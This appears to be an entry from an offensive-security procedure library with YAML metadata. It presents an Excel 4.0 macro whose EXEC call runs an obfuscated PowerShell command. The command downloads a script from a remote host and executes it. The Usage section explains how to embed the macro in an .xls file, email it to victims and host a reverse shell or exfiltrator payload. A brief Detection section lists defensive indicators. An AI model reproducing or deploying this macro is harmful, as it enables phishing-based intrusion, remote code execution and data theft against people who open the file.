---
id: fc37e30d-5d73-461c-aa35-a4cc53894b3e
type: code
language: xlm
verified: true
created_at: '2023-04-06T03:56:23.326708+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - macro
  - powershell
  - execution
  - xlm
validated: true
---

# XLM-Macro-for-PowerShell-Download-and-Execute

## Code

```xlm
=EXEC("poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')")
=halt()
```

## Description

This XLM (Excel 4.0) macro uses the EXEC function to execute an obfuscated PowerShell command that downloads a script from a remote server using .NET WebClient's DownloadString method and invokes it with IEX (Invoke-Expression). The halt() function terminates the macro after execution to prevent further processing. It is designed for embedding in Excel sheets to achieve code execution upon macro enablement, commonly used in phishing attacks to bypass VBA restrictions.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| URL in DownloadString | The HTTP/HTTPS URL hosting the PowerShell script to download and execute | `http://10.10.10.10:80/update.ps1` |

## Usage

Insert this code into an Excel sheet (e.g., cell A1) in a new workbook, save as .xls format, and deliver via email or file share. When the victim opens the file and enables macros, the PowerShell script will download and run automatically. Ensure the hosted script (.ps1) contains the desired payload, such as a reverse shell or data exfiltrator. Test in a VM to confirm execution without alerts.

## Detection

- Excel macro execution events in ETW logs or Sysmon (Event ID 1 for process creation of powershell.exe from excel.exe).
- Network connections from Excel/PowerShell to unexpected IPs/ports (monitor for DownloadString URIs).
- AMSI scans for IEX and WebClient usage; enable ScriptBlock logging to capture the downloaded script.
- File-based detection: Scan .xls files for EXEC functions containing 'poWerShell' or similar obfuscated strings.

## Related

- [[procedures/Execute-PowerShell-via-XLM-Macro-in-Excel]]
